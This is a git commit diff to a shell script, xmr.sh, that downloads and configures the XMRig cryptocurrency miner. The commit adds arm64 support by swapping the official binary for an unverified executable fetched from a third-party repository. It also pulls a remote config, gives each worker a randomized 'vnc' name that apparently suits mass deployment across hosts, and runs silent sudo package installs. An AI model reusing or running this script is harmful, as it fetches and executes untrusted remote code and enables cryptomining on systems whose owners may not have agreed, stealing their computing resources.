f4c87f8d29423c7187289bdcafcdf335a79aaf55
GaminnLinux <gaminnlinuxgit@proton.me>
2024-06-12 20:09:18 +0200

    arm64 support and make lscpu work on more systems

--- xmr.sh
+++ xmr.sh
@@ -14,16 +14,34 @@ else
     DOWNLOAD_CMD="curl -O"
 fi
 
+# arm64 check
+arch=$(uname -m)
+is_arm64=false
+
+if [ "$arch" == "aarch64" ]; then
+    is_arm64=true
+fi
+
 # use curl because it's present on more distributions
 $DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
 tar -xf xmrig-6.21.3-linux-static-x64.tar.gz
 cd xmrig-6.21.3
+
+# replace xmrig file if system is arm64
+if $is_arm64; then
+    rm -rf xmrig
+    $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/xmrig
+fi
 
 rm -rf config.json
 $DOWNLOAD_CMD https://raw.githubusercontent.com/spetterman66/verynicerepo/main/config.json
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json
 
+sudo -n apk add util-linux
+sudo -n apt update
+sudo -n apt install -y util-linux
+sudo -n dnf install util-linux
 num_threads=$(lscpu | grep "^CPU(s):" | awk '{print $2}')
 
 # generate the replacement string with -1 repeated num_threads times, separated by commas
